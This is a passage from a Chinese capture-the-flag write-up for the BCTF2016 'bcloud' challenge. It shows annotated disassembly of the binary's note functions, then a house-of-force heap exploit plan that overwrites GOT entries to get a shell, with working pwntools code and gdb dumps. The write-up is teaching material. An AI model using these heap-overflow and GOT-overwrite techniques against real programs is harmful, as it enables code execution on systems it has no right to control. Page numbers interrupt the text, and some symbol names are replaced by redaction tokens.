| | 0x08048a08 call sub.atoi_709
; 调用函数读入 length
| | 0x08048a0d mov dword [local_ch], eax
1310
6.1.23 pwn BCTF2016 bcloud
; 将 length 放到 [local_ch]
| | 0x08048a10 mov eax, dword [local_ch]
| | 0x08048a13 add eax, 4
; length = length + 4
| | 0x08048a16 mov dword [esp], eax
| | 0x08048a19 call sym.imp.malloc
; malloc(length + 4) 为 note 分配空间
| | 0x08048a1e mov edx, eax
| | 0x08048a20 mov eax, dword [local_10h]
; eax = i
| | 0x08048a23 mov dword [eax*4 + 0x804b120], edx
; 将 note 地址放到 notes[i]
| | 0x08048a2a mov eax, dword [local_10h]
| | 0x08048a2d mov eax, dword [eax*4 + 0x804b120]
; 取出 notes[i]
| | 0x08048a34 test eax, eax
| |,= 0x08048a44 mov eax, dword [local_10h]
| | 0x08048a47 mov edx, dword [local_ch]
| | 0x08048a4a mov dword [eax*4 + 0x804b0a0], edx
; lengths[i] = length
| | 0x08048a51 mov dword [esp], str.Input_the_conte
nt: ; [0x8048f12:4]=0x75706e49 ; "Input the content:"
| | 0x08048a58 call sym.imp.puts
; int puts(const char *s)
| | 0x08048a5d mov eax, dword [local_10h]
| | 0x08048a60 mov eax, dword [eax*4 + 0x804b120]
; [0x804b120:4]=0
| | 0x08048a67 mov dword [esp + 8], 0xa
| | 0x08048a6f mov edx, dword [local_ch]
| | 0x08048a72 mov dword [esp + 4], edx
; [esp + 4] = length
| | 0x08048a76 mov dword [esp], eax
1311
6.1.23 pwn BCTF2016 bcloud
; [esp] = notes[i]
| | 0x08048a79 call sub.read_68d
; read_68d(notes[i], length, 0xa) 调用函数读入 content
| | 0x08048a7e mov eax, dword [local_10h]
| | 0x08048a81 mov dword [esp + 4], eax
| | 0x08048a85 mov dword [esp], str.Create_success_
_the_id_is__d ; [0x8048f25:4]=0x61657243 ; "Create success, the
id is %d\n"
| | 0x08048a8c call sym.imp.printf
; int printf(const char *format)
| | 0x08048a91 mov eax, dword [local_10h]
| | 0x08048a94 mov dword [eax*4 + 0x804b0e0], 0
; syns[i] = 0
| | 0x08048a9f nop
| | ; JMP XREF from 0x080489f7 (sub.Input_the_length_of_
the_note_content:_9ae)
| `--> 0x08048aa0 leave
\ 0x08048aa1 ret
我们可以得到下面的数据结构：
int *lengths[10]; // 0x804b0a0
int *syns[10]; // 0x804b0e0
int *notes[10]; // 0x804b120
三个数组都是通过指标 i 来对应的，分别存放 note 地址，length 及是否同步。
Edit note
[0x08048590]> pdf @ sub.Input_the_id:_ab7
/ (fcn) sub.Input_the_id:_ab7 172
| sub.Input_the_id:_ab7 (int arg_9h);
| ; var int local_14h @ ebp-0x14
| ; var int local_10h @ ebp-0x10
| ; var int local_ch @ ebp-0xc
| ; var int local_0h @ ebp-0x0
| ; arg int arg_9h @ ebp+0x9
| ; CALL XREF from 0x08048d1f (main + 158)
1312
6.1.23 pwn BCTF2016 bcloud
| 0x08048ab7 push ebp
| 0x08048ab8 mov ebp, esp
| 0x08048aba sub esp, 0x28
; '('
| 0x08048abd mov dword [local_14h], 0
| 0x08048ac4 mov dword [esp], str.Input_the_id:
; [0x8048f65:4]=0x75706e49 ; "Input the id:"
| 0x08048acb call sym.imp.puts
; int puts(const char *s)
| 0x08048ad0 call sub.atoi_709
; int atoi(const char *str)
| 0x08048ad5 mov dword [local_14h], eax
; 读入 i
| 0x08048ad8 cmp dword [local_14h], 0
| ,= 0x08048ae4 mov dword [esp], str.Invalid_ID.
; [0x8048f73:4]=0x61766e49 ; "Invalid ID."
| | 0x08048aeb call sym.imp.puts
; int puts(const char *s)
| |,= 0x08048af2 mov eax, dword [local_14h]
; 0  0x08048b13 mov eax, dword [local_14h]
| | | 0x08048b16 mov eax, dword [eax*4 + 0x804b0a0]
; 取出 lengths[i]
| | | 0x08048b1d mov dword [local_ch], eax
; 将 lengths[i] 放到 [local_ch]
| | | 0x08048b20 mov eax, dword [local_14h]
| | | 0x08048b23 mov dword [eax*4 + 0x804b0e0], 0
; 将 syns[i] 赋值为 0
| | | 0x08048b2e mov dword [esp], str.Input_the_new_c
ontent: ; [0x8048f96:4]=0x75706e49 ; "Input the new content:"
| | | 0x08048b35 call sym.imp.puts
; int puts(const char *s)
| | | 0x08048b3a mov dword [esp + 8], 0xa
| | | 0x08048b42 mov eax, dword [local_ch]
| | | 0x08048b45 mov dword [esp + 4], eax
| | | 0x08048b49 mov eax, dword [local_10h]
| | | 0x08048b4c mov dword [esp], eax
| | | 0x08048b4f call sub.read_68d
; read_68d(notes[i], lengths[i], 0xa) 读入新 content 到原
位置，长度不变
| | | 0x08048b54 mov dword [esp], str.Edit_success.
; [0x8048fad:4]=0x74696445 ; "Edit success."
| | | 0x08048b5b call sym.imp.puts
; int puts(const char *s)
| | | 0x08048b60 nop
| | | ; JMP XREF from 0x08048af0 (sub.Input_the_id:_ab7)
| | | ; JMP XREF from 0x08048b11 (sub.Input_the_id:_ab7)
| `-`-> 0x08048b61 leave
\ 0x08048b62 ret
该函数在修改 note 时，先将 syns[i] 清空，然后读入 lengths[i] 长度的内容到
notes[i]。
Delete note
[0x08048590]> pdf @ sub.Input_the_id:_b63
/ (fcn) sub.Input_the_id:_b63 146
| sub.Input_the_id:_b63 (int arg_9h);
1314
6.1.23 pwn BCTF2016 bcloud
| ; var int local_10h @ ebp-0x10
| ; var int local_ch @ ebp-0xc
| ; var int local_0h @ ebp-0x0
| ; arg int arg_9h @ ebp+0x9
| ; CALL XREF from 0x08048d26 (main + 165)
| 0x08048b63 push ebp
| 0x08048b64 mov ebp, esp
| 0x08048b66 sub esp, 0x28
; '('
| 0x08048b69 mov dword [local_10h], 0
| 0x08048b70 mov dword [esp], str.Input_the_id:
; [0x8048f65:4]=0x75706e49 ; "Input the id:"
| 0x08048b77 call sym.imp.puts
; int puts(const char *s)
| 0x08048b7c call sub.atoi_709
; int atoi(const char *str)
| 0x08048b81 mov dword [local_10h], eax
| 0x08048b84 cmp dword [local_10h], 0
| ,= 0x08048b90 mov dword [esp], str.Invalid_ID.
; [0x8048f73:4]=0x61766e49 ; "Invalid ID."
| | 0x08048b97 call sym.imp.puts
; int puts(const char *s)
| |,= 0x08048b9e mov eax, dword [local_10h]
; 0  0x08048bbf mov eax, dword [local_10h]
| | | 0x08048bc2 mov dword [eax*4 + 0x804b120], 0
; 将 notes[i] 置 0
| | | 0x08048bcd mov eax, dword [local_10h]
| | | 0x08048bd0 mov dword [eax*4 + 0x804b0a0], 0
; 将 lengths[i] 置 0
| | | 0x08048bdb mov eax, dword [local_ch]
| | | 0x08048bde mov dword [esp], eax
| | | 0x08048be1 call sym.imp.free
; free([local_ch])，释放 note
| | | 0x08048be6 mov dword [esp], str.Delete_success.
; [0x8048fbb:4]=0x656c6544 ; "Delete success."
| | | 0x08048bed call sym.imp.puts
; int puts(const char *s)
| | | 0x08048bf2 nop
| | | ; JMP XREF from 0x08048b9c (sub.Input_the_id:_b63)
| | | ; JMP XREF from 0x08048bbd (sub.Input_the_id:_b63)
| `-`-> 0x08048bf3 leave
\ 0x08048bf4 ret
该函数首先判断 notes[i] 是否存在，如果存在则释放 notes[i] 并将 notes[i] 和
lengths[i] 都置 0。不存在悬指针等漏洞。
至于 Syn 功能，就是将 syns[i] 都置 1，对漏洞利用没有影响。
漏洞利用
所以这题的利用思路就是 house-of-force，步骤如下：
泄漏 heap 地址
利用溢出修改 top chunk 的 size
分配一个 chunk，将 top chunk 转移到 lengths 数组前面
再次分配 chunk，即可覆盖 notes，并利用 Edit 修改其内容
修改 PI:EMAIL 为 PI:EMAIL ，泄漏 libc
修改 PI:EMAIL 为 PI:EMAIL ，得到 shell
1316
6.1.23 pwn BCTF2016 bcloud
leak heap
def leak_heap():
global leak
io.sendafter("name:\n", "A" * 0x40)
leak = u32(io.recvuntil('! Welcome', drop=True)[-4:])
log.info("leak heap address: 0x%x" % leak)
gdb-peda$ x/17wx 0xffffb834
0xffffb834: 0x41414141 0x41414141 0x41414141 0x41414
141 <-- stack
0xffffb844: 0x41414141 0x41414141 0x41414141 0x41414
141
0xffffb854: 0x41414141 0x41414141 0x41414141 0x41414
141
0xffffb864: 0x41414141 0x41414141 0x41414141 0x41414
141
0xffffb874: 0x0804c008 <
-- pointer
gdb-peda$ x/19wx 0x0804c008-0x8
0x804c000: 0x00000000 0x00000049 0x41414141 0x414141
41 <-- heap
0x804c010: 0x41414141 0x41414141 0x41414141 0x414141
41
0x804c020: 0x41414141 0x41414141 0x41414141 0x414141
41
0x804c030: 0x41414141 0x41414141 0x41414141 0x414141
41
0x804c040: 0x41414141 0x41414141 0x0804c008
<-- pointer
可以看到对指针被复制到了堆中，只要将其打印出来即可。
house-of-force
1317
6.1.23 pwn BCTF2016 bcloud
def house_of_force():
io.sendafter("Org:\n", "A" * 0x40)
io.sendlineafter("Host:\n", p32(0xffffffff)) # overflow
new((bss_addr - 0x8) - (leak + 0xd0) - 0x8 - 4, 'AAAA') # 0x
d0 = top chunk - leak
payload = "A" * 0x80
payload += p32(elf.got['free']) # notes[0]
payload += p32(elf.got['atoi']) * 2 # notes[1], notes[2]
new(0x8c, payload)
接下来是 house-of-force，通过溢出修改 top chunk 的 size，可以在下次 malloc 时
将 top chunk 转移到任意地址，之后的 chunk 也将依据转移后的 top chunk 来分
配。
溢出：
gdb-peda$ x/22wx 0x804c098-0x8
0x804c090: 0x00000000 0x00000049 0x41414141 0x414141
41
0x804c0a0: 0x41414141 0x41414141 0x41414141 0x414141
41
0x804c0b0: 0x41414141 0x41414141 0x41414141 0x414141
41
0x804c0c0: 0x41414141 0x41414141 0x41414141 0x414141
41